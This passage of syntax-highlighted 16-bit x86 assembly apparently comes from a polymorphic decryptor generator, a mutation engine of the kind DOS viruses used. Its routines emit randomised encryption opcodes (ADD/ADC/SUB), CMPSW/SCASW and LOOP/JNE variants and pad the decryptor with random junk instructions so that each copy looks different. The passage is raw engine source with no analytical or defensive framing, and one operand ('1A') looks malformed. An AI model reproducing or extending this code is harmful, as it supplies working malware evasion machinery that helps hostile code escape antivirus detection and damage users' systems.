&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0C0h</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">test</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">bh</span><span style="color: #339933;">,</span><span style="color: #ff0000;">1</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;up or down?</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jz</span>&nbsp; &nbsp; &nbsp; short ADC_<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0E8h</span><br />
<br />
ADC_<span style="color: #339933;">:</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">test</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">bh</span><span style="color: #339933;">,</span><span style="color: #ff0000;">40h</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;carry?</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jz</span>&nbsp; &nbsp; &nbsp; short No_ADC<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">and</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0CFh</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">or</span>&nbsp; &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span><span style="color: #ff0000;">10h</span><br />
<br />
No_ADC<span style="color: #339933;">:</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span>&nbsp; &nbsp; add_ind<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">stosb</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span><span style="color: #ff0000;">1</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;value to add/sub</span><br />
<br />
Store_ADD<span style="color: #339933;">:</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span>&nbsp; &nbsp; Enc_BorW<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">stosb</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">ret</span><br />
<br />
CMPSW_<span style="color: #339933;">:</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">test</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">bh</span><span style="color: #339933;">,</span><span style="color: #ff0000;">1</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;up or down?</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jz</span>&nbsp; &nbsp; &nbsp; short No_STD<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0FDh</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;insert STD</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">stosb</span><br />
<br />
No_STD<span style="color: #339933;">:</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">test</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">bh</span><span style="color: #339933;">,</span><span style="color: #ff0000;">4</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;CMPSW or SCASW?</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jz</span>&nbsp; &nbsp; &nbsp; short Do_CMPSW<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">test</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">bl</span><span style="color: #339933;">,</span><span style="color: #ff0000;">4</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;no SCASW if SI is used</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jnz</span> &nbsp; &nbsp; short Do_SCASW<br />
<br />
Do_CMPSW<span style="color: #339933;">:</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0A6h</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;CMPSB</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jmp</span> &nbsp; &nbsp; short Store_ADD<br />
<br />
Do_SCASW<span style="color: #339933;">:</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0AEh</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;SCASB</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jmp</span> &nbsp; &nbsp; short Store_ADD<br />
<br />
<span style="color: black; font-style: italic;">;--- Generate LOOP command --------------------------------</span><br />
<br />
Gen_Loop<span style="color: #339933;">:</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">test</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">bh</span><span style="color: #339933;">,</span><span style="color: #ff0000;">1</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;no JNE if counting down</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jnz</span> &nbsp; &nbsp; short LOOPNZ_LOOP &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; (prefetch bug!)</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span>&nbsp; &nbsp; Random_Number<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">test</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span><span style="color: #ff0000;">1</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;LOOPNZ/LOOP or JNE?</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jnz</span> &nbsp; &nbsp; short Lower_CX<br />
<br />
LOOPNZ_LOOP<span style="color: #339933;">:</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0E0h</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">test</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">bh</span><span style="color: #339933;">,</span>1A &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;LOOPNZ or LOOP?</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jz</span>&nbsp; &nbsp; &nbsp; short No_LOOPNZ &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; no LOOPNZ if xor-offset</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">add</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span><span style="color: #ff0000;">2</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; no LOOPNZ if CMPSW/SCASW</span><br />
<br />
No_LOOPNZ<span style="color: #339933;">:</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">stosb</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">dx</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">sub</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">di</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">dec</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">stosb</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">ret</span><br />
<br />
Lower_CX<span style="color: #339933;">:</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">test</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">bh</span><span style="color: #339933;">,</span><span style="color: #ff0000;">10h</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;SUB CX or DEC CX?</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jnz</span> &nbsp; &nbsp; short DEC_CX<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0E983h</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">stosw</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span><span style="color: #ff0000;">1</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;SUB CX</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">stosb</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jmp</span> &nbsp; &nbsp; short JNE_<br />
<br />
DEC_CX<span style="color: #339933;">:</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span><span style="color: #ff0000;">49h</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;DEC CX</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">stosb</span><br />
<br />
JNE_<span style="color: #339933;">:</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span><span style="color: #ff0000;">75h</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;JNE</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jmp</span> &nbsp; &nbsp; short No_LOOPNZ &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;create location</span><br />
<br />
<span style="color: black; font-style: italic;">;--- Add value to AL depending on register type</span><br />
<br />
add_ind<span style="color: #339933;">:</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">lea</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">si</span><span style="color: #339933;">,</span>ind_change<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jmp</span> &nbsp; &nbsp; short xx1<br />
<br />
add_dir<span style="color: #339933;">:</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">lea</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">si</span><span style="color: #339933;">,</span>dir_change<br />
<br />
xx1<span style="color: #339933;">:</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">bx</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">shr</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">bl</span><span style="color: #339933;">,</span><span style="color: #ff0000;">2</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">and</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">bx</span><span style="color: #339933;">,</span><span style="color: #ff0000;">3</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;4 options</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">add</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span><span style="color: #0000ff; font-weight: bold;">byte</span> ptr <span style="color: #46aa03; font-weight: bold;">ds</span><span style="color: #339933;">:</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">bx</span><span style="color: #339933;">+</span><span style="color: #46aa03; font-weight: bold;">si</span><span style="color: black;">&#93;</span>&nbsp; <span style="color: black; font-style: italic;">;</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">bx</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">ret</span><br />
<br />
<span style="color: black; font-style: italic;">;--- move encryption command byte into AL -----------------</span><br />
<br />
Get_Crypter<span style="color: #339933;">:</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">bx</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">lea</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span>enc_type<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">xchg</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">bx</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ax</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">and</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span><span style="color: #ff0000;">3</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; xlat<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">bx</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">ret</span><br />
<br />
<span style="color: black; font-style: italic;">;--- Change ADD to ADC ------------------------------------</span><br />
<br />
ADD_2_ADC<span style="color: #339933;">:</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">test</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">bl</span><span style="color: #339933;">,</span><span style="color: #ff0000;">2</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;ADD/SUB used for encryption?</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jz</span>&nbsp; &nbsp; &nbsp; short No_Carry<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">test</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">bh</span><span style="color: #339933;">,</span><span style="color: #ff0000;">20h</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;carry with (encr.) ADD/SUB?</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jz</span>&nbsp; &nbsp; &nbsp; short No_Carry<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">and</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0CFh</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">or</span>&nbsp; &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span><span style="color: #ff0000;">10h</span><br />
<br />
No_Carry<span style="color: #339933;">:</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">ret</span><br />
<br />
<span style="color: black; font-style: italic;">;--- Change AL (byte/word) --------------------------------</span><br />
<br />
Enc_BorW<span style="color: #339933;">:</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">test</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">bl</span><span style="color: #339933;">,</span><span style="color: #ff0000;">10h</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jz</span>&nbsp; &nbsp; &nbsp; short Enc_Byte<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">inc</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">al</span><br />
<br />
Enc_Byte<span style="color: #339933;">:</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">ret</span><br />
<br />
<span style="color: black; font-style: italic;">;--- Change AL (byte/word) --------------------------------</span><br />
<br />
Mov_BorW<span style="color: #339933;">:</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span>&nbsp; &nbsp; Enc_BorW<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">cmp</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span><span style="color: #ff0000;">81h</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;can't touch this</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">je</span>&nbsp; &nbsp; &nbsp; short Mov_Byte<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span>&nbsp; &nbsp; Random_Number<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">test</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span><span style="color: #ff0000;">1</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jz</span>&nbsp; &nbsp; &nbsp; short Mov_Byte<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">add</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span><span style="color: #ff0000;">2</span><br />
<br />
Mov_Byte<span style="color: #339933;">:</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">ret</span><br />
<br />
<span style="color: black; font-style: italic;">;--- Insert random instructions ---------------------------</span><br />
<br />
Fill_NOPs<span style="color: #339933;">:</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span>&nbsp; &nbsp; Random_Number &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;put a random number of</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">and</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span><span style="color: #ff0000;">7fh</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;dummy instructions before</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">cmp</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;decryptor (max=7Fh bytes)</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">je</span>&nbsp; &nbsp; &nbsp; short No_NOPs<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">xchg</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">cx</span><br />
<br />
NOP_Loop<span style="color: #339933;">:</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span>&nbsp; &nbsp; junk<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">loop</span>&nbsp; &nbsp; NOP_Loop<br />
<br />
No_NOPs<span style="color: #339933;">:</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">ret</span><br />
<br />
<span style="color: black; font-style: italic;">;--- Get rough random NOP (may affect register values -----</span><br />
<br />
junk<span style="color: #339933;">:</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span>&nbsp; &nbsp; Random_Number<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">and</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span><span style="color: #ff0000;">1Eh</span><br />
